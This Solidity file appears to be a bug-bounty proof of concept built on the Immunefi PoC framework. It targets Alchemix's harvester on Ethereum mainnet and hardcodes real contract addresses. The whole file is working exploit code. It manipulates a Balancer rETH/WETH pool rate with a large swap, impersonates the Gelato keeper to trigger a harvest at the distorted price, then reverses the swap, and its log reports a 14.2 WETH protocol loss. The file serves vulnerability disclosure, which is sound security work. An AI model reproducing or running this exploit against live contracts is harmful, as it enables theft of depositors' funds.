// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@immunefi/PoC.sol";
import "./external/AlchemistV2.sol";
import "./external/IAlchemixHarvester.sol";
import "./external/BalancerContract.sol";
import "./external/IAutomate.sol";
import "./external/rETH.sol";

contract AttackContract is PoC {
    // Tokens
    IERC20 constant rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    IERC20 constant alETH = IERC20(0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c);
    bytes32 constant RethWethBalPool = 0x1e19cf2d73a72ef1332c882f20534b6519be0276000200000000000000000112;

    // Alchemix
    AlchemistV2 constant alchemistV2 = AlchemistV2(0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c);
    IAlchemixHarvester constant harvester = IAlchemixHarvester(0x7879A9c464af7805712404Cf4A8366c475034F91);

    // Balancer
    Vault constant balancer = Vault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    // Gelato
    IAutomate constant automate = IAutomate(0xB3f5503f93d5Ef84b06993a1975B9D21B962892F);

    // Actors
    address constant gelato = 0x3CACa7b48D0573D793d3b0279b5F0029180E83b6; // Gelato keeper

    function initializeAttack() public {
        console.log("\n>>> Initialize attack");
        // The normal profit the harvest should gain according to https://etherscan.io/tx/0xad98a7f2b1bdece002fa0acea3177439f3a00062be72126f4c3d67e06222659f
        console.log("Expected Harvest profit: 17.38 WETH");
        vm.startPrank(address(this), address(this));

        bytes memory call_data =
            abi.encodeWithSelector(IAlchemixHarvester.harvest.selector, address(alETH), address(rETH), 1);
        automate.createTask(
            address(harvester), call_data, IAutomate.ModuleData(new IAutomate.Module[](0), new bytes[](0)), address(0)
        );

        _executeAttack();
    }

    function _executeAttack() internal {
        console.log("\n>>> Execute attack");

        // Manipulate the Balancer rate up
        console.log("Manipulate Balancer rate up");
        rETH.approve(address(balancer), 99999999999 ether);
        Vault.SingleSwap memory singleSwap;
        singleSwap.poolId = RethWethBalPool;
        singleSwap.kind = 0;
        singleSwap.assetIn = address(rETH);
        singleSwap.assetOut = address(EthereumTokens.WETH);
        singleSwap.amount = 13500 ether;
        singleSwap.userData = abi.encodePacked(RethWethBalPool);

        Vault.FundManagement memory fundManagement;
        fundManagement.sender = address(this);
        fundManagement.fromInternalBalance = false;
        fundManagement.recipient = address(this);
        fundManagement.toInternalBalance = false;
        balancer.swap(singleSwap, fundManagement, 0, 9999999999999);

        EthereumTokens.WETH.approve(address(balancer), 999999999999999 ether);

        // Trigger the harvest from Gelato keeper
        console.log("Harvest");
        vm.startPrank(gelato, gelato);
        automate.exec(
            address(this),
            address(harvester),
            abi.encodeWithSelector(IAlchemixHarvester.harvest.selector, address(alETH), address(rETH), 1),
            IAutomate.ModuleData(new IAutomate.Module[](0), new bytes[](0)),
            0,
            address(0),
            false,
            false
        );

        vm.startPrank(address(this), address(this));

        // rebalance pool and unmanipulate using weth balance left
        uint256 WETHBalance = EthereumTokens.WETH.balanceOf(address(this));

        Vault.SingleSwap memory singleSwap2;
        singleSwap2.poolId = RethWethBalPool;
        singleSwap2.kind = 0;
        singleSwap2.assetIn = address(EthereumTokens.WETH);
        singleSwap2.assetOut = address(rETH);
        singleSwap2.amount = WETHBalance;
        singleSwap2.userData = abi.encodePacked(RethWethBalPool);

        Vault.FundManagement memory fundManagement2;
        fundManagement2.sender = address(this);
        fundManagement2.fromInternalBalance = false;
        fundManagement2.recipient = address(this);
        fundManagement2.toInternalBalance = false;

        // Manipulate the Balancer rate back down
        console.log("Manipulate Balancer rate back down");
        balancer.swap(singleSwap2, fundManagement2, 0, 9999999999999);

        _completeAttack();
    }

    function _completeAttack() internal {
        console.log("\n>>> Complete attack");
        console.log("Protocol loss: 14.2 WETH\n");

        vm.stopPrank();
    }
}
